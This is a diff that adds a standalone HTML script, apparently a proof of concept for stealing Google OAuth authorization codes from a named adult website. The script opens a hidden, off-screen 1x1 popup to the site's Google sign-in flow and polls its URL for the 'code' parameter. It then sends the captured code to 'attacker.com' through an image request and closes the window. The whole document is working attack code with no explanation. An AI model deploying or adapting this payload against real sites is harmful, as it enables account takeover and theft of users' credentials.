@@ -1,0 +1,15 @@
+<script>
+setTimeout(() => {
+  var p = window.open('https://stripchat.com/googleAuthorization.html?auth_url=' + encodeURIComponent('https://accounts.google.com/o/oauth2/v2/auth?client_id=67819290237-pean7okuo1c6a4bf5g19d9anjj15uvp6.apps.googleusercontent.com&redirect_uri=https://stripchat.com/googleAuthorization.html&response_type=code&scope=email'), '', 'width=1,height=1,left=-1000');
+  var i = setInterval(() => {
+    try {
+      if (p.location.href.includes('code=')) {
+        clearInterval(i);
+        var c = p.location.href.split('code=')[1].split('&')[0];
+        new Image().src = 'https://attacker.com/log?c=' + c;
+        p.close();
+      }
+    } catch(e) {}
+  }, 300);
+}, 1000);
+</script>
